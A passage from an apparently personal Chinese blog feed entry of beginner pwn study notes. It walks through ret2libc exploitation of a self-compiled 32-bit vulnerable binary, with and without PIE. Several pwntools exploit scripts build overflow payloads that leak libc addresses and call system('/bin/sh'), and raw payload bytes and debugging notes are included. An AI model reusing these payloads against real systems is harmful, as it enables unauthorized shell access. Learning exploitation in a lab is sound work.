class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]) + p32(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;B&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;书里给的有问题,总感觉少了什么条件,exp跑不通&lt;/p&gt;
&lt;p&gt;[&lt;em&gt;] Switching to int eractive mode&lt;br&gt;[&lt;/em&gt;] Got EOF while reading in interactive&lt;/p&gt;
&lt;p&gt;为什么第一个exp不行,这个链接里的就可以??,进行分析&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_44644249/article/details/113620457&#34;&gt;https://blog.csdn.net/weixin_44644249&amp;#x2F;article&amp;#x2F;details&amp;#x2F;113620457&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先先把payload进行输出&lt;/p&gt;
&lt;p&gt;payload1和2&lt;/p&gt;
&lt;p&gt;b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \x83\x04\x08;\x84\x04\x08\x01\x00\x00\x00\x14\xa0\x04\x08\x04\x00\x00\x00’&lt;br&gt;b’BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\xb0\xdd\xd8\xf7;\x84\x04\x08+\xeb\xea\xf7’&lt;/p&gt;
&lt;p&gt;然后再看成功的&lt;/p&gt;
&lt;p&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk \x04V\x04\x00\x00 \x04\x04\x00&lt;br&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk°à÷junk+»ò÷&lt;/p&gt;
&lt;p&gt;所以应该是编码问题?? 或者是作者用的python2?? 是python2和3的问题??&lt;/p&gt;
&lt;p&gt;只能说自己太蠢了,(也想吐槽作者写的不好,不该写死的东西干嘛要写死,自己又没给二进制文件)&lt;/p&gt;
&lt;p&gt;当然更重要的是,不能照抄别人的,要对exp的每一行的含义都了如指掌才可以!!!&lt;/p&gt;
&lt;p&gt;作者在exp中给的 vuln_func的地址是写死的,但事实上自己编译的话肯定会有不同,所以需要根据实际情况修改, 或者直接动态获取,不要写死!!!&lt;/p&gt;
&lt;p&gt;0x080484a5 &amp;lt;+26&amp;gt;:	e8 ac ff ff ff	call 0x8048456 &lt;vuln_func&gt;&lt;/vuln_func&gt;&lt;/p&gt;
&lt;p&gt;exp修改的部分为vuln_func &amp;#x3D; elf.sym[“vuln_func”] &lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./nopie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./nopie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln_func = elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;vuln_func&amp;quot;&lt;/span&gt;] &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]) + p32(vuln_func) + p32(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p32(elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]) + p32(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;b&amp;quot;B&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;在此基础之上-开启PIE&#34;&gt;&lt;a href=&#34;#在此基础之上-开启PIE&#34; class=&#34;headerlink&#34; title=&#34;在此基础之上,开启PIE&#34;&gt;&lt;/a&gt;在此基础之上,开启PIE&lt;/h1&gt;&lt;p&gt;开启了pie后,程序的加载地址就不是固定的0x8048000了,所以直接用elf.sym[“vuln_func”] 是不行的,需要知道是从哪里开始加载的了&lt;/p&gt;
&lt;p&gt;gcc -m32 -fno-stack-protector -z noexecstack -pie -fno-pie dep.c -o pie.out&lt;/p&gt;
&lt;p&gt;patchelf –set-interpreter &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F;ld-linux.so.2 .&amp;#x2F;pie.out&lt;br&gt;patchelf –set-rpath &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu11.3_i386&amp;#x2F; .&amp;#x2F;pie.out&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;加载的时候,每次地址就不一样了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x565555a3&lt;/span&gt; &amp;lt;main+&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;&amp;gt;        call   &lt;span class=&#34;number&#34;&gt;0x5655556d&lt;/span&gt; &amp;lt;vuln_func&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x5655556d&lt;/span&gt; &amp;lt;vuln_func&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x81e58955&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;结果..加载的地址每次还是一样的,经过排查是gdb的问题&lt;/p&gt;
&lt;h2 id=&#34;为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了&#34;&gt;&lt;a href=&#34;#为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了&#34; class=&#34;headerlink&#34; title=&#34;为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????&#34;&gt;&lt;/a&gt;为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_43350880/article/details/98869099&#34;&gt;https://blog.csdn.net/weixin_43350880&amp;#x2F;article&amp;#x2F;details&amp;#x2F;98869099&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;因为gdb是默认关闭aslr的,通过在gdb中输入命令aslr on开启,然后每次加载的地址就不一样了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56630000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56631000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56631000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56632000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56632000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56633000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; rw- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56613000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56614000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56614000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56615000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56615000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56616000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; rw- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x565f3000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x565f4000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-x /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x565f4000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x565f5000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x000000&lt;/span&gt; r-- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x565f5000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x565f6000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x001000&lt;/span&gt; rw- /home/ubuntu/pwn/pie.out&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这样的话,elf.sym[“vuln_func”]  就不能用了,因为有一块随机加载的偏移,需要想办法泄露&lt;/p&gt;
&lt;p&gt;假设我们已经泄露了&lt;/p&gt;
&lt;p&gt; (在dep.c中加入 printf(“main addr: %p”,&amp;amp;main); 但是捏,这个有问题,问题就是哪怕你把它加在了前面,它也是后输出的,这是为什么呢,我们假设的应该是先得到这个地址,然后给vuln_func发送payload&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; main(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; argc, char *argv[]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        printf(&lt;span class=&#34;string&#34;&gt;&amp;quot;main addr: %p&amp;quot;&lt;/span&gt;,&amp;amp;main);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vuln_func();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        write(STDOUT_FILENO, &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hello world!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main addr: &lt;span class=&#34;number&#34;&gt;0x5658c5d2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;write&#34;&gt;&lt;a href=&#34;#write&#34; class=&#34;headerlink&#34; title=&#34;write&#34;&gt;&lt;/a&gt;write&lt;/h3&gt;&lt;p&gt;这个应该是和缓冲区什么的有关&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://oomake.com/question/2542933&#34;&gt;https://oomake.com/question/2542933&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;printf带缓冲区,所以要等缓冲区满或者遇到换行符才会输出,write不带缓冲区,直接就输出了&lt;/p&gt;
&lt;p&gt;加一个换行符就可以了&lt;/p&gt;
&lt;p&gt;printf(“main addr: %p\n”,&amp;amp;main);&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;这里假设了会泄漏main的地址,我们加一行代码就直接打印出来了,&lt;/p&gt;
&lt;p&gt;printf(“%p\n”,&amp;amp;main);&lt;/p&gt;
&lt;p&gt;然后接收main的地址,其他的思路就差不多了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pie.out&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvline(), &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base_addr = main_addr - elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;main&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vuln_func = base_addr + elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;vuln_func&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;plt_write = base_addr + elf.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;got_write = base_addr + elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ebx = base_addr + &lt;span class=&#34;number&#34;&gt;0x2000&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;# GOT address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt; + p32(ebx) + &lt;span class=&#34;string&#34;&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt; + p32(plt_write) + p32(vuln_func) + p32(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p32(got_write) + p32(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write_addr = u32(io.recv())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh_addr = write_addr - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;write&amp;#x27;&lt;/span&gt;] + &lt;span class=&#34;built_in&#34;&gt;next&lt;/span&gt;(libc.search(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2 = &lt;span class=&#34;string&#34;&gt;&amp;quot;B&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;140&lt;/span&gt; + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如果printf有其他字母呢,怎么接收?&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2022-11-25T08:45:37.000Z</updated>
    </entry>
    <entry>
